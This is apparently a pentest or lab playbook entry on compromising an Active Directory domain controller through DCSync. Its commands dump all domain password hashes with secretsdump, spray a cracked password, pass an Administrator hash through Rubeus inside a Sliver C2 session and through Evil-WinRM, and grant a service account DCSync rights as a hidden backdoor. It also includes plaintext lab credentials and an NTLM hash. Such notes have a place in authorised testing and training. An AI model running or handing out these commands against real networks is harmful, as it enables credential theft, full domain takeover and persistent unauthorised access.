# 15.06 DCSync DC Compromise

> DCSync via `secretsdump` (remote), `lsadump::dcsync` (Windows), or grant a backdoor user the right via `Add-DomainObjectAcl`.

## Overview

DCSync is performed via secretsdump (remote), mimikatz lsadump::dcsync, or by granting a user DCSync rights with SharpView/PowerView Add-DomainObjectAcl. Evil-WinRM with PowerView loaded provides the most interactive path to adding DCSync backdoors to domain objects.

## Steps

- Use secretsdump via proxychains to dump all domain hashes remotely.
- Verify mobilesec/websec share the same cracked password; check BloodHound for DCSync.
- Method 1: inject Rubeus TGT via `rubeus -- asktgt /user:Administrator /rc4:<hash> /ptt`, then use psexec to get SYSTEM on DC01.
- Method 2: Evil-WinRM to DC01 with admin hash; load PowerView.ps1; Add-DomainObjectAcl for DCSync backdoor.
- Grant SharpView DCSync via `sharpview -- 'Add-DomainObjectAcl -PrincipalIdentity svc_sql -Rights DCSync'` from DC01 session.

## Commands

### secretsdump via proxychains

```bash
proxychains impacket-secretsdump -just-dc  mobilesec:spongebob@<TARGET> | grep -i child.htb.local
```

### Spray cracked password

```bash
proxychains -q nxc ldap <TARGET> -u websec mobilesec -p spongebob --continue-on-success
```

### Rubeus asktgt for Administrator ptt

```text
sliver (http) > rubeus -- asktgt /user:Administrator /d:child.htb.local /rc4:e7d6a507876e2c8b7534143c1c6f28ba /ptt
```

### Verify DC access after TGT injection

```text
sliver (http) > ls //dc01.child.htb.local/c$
```

### Add DCSync via SharpView (DC01 session)

```text
sliver (psexec-pivot) > sharpview -- 'Add-DomainObjectAcl  -PrincipalIdentity svc_sql -Rights DCSync'
```

### Verify DCSync with secretsdump

```bash
proxychains impacket-secretsdump -just-dc 'svc_sql:jkhnrjk123!'@<TARGET> | grep -i :::
```

### Evil-WinRM to DC with hash

```bash
proxychains evil-winrm -i <TARGET> -u Administrator -H e7d6a507876e2c8b7534143c1c6f28ba -s .
```

### Add DCSync via Evil-WinRM PowerView

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> Add-DomainObjectAcl  -PrincipalIdentity svc_sql -Rights DCSync
```
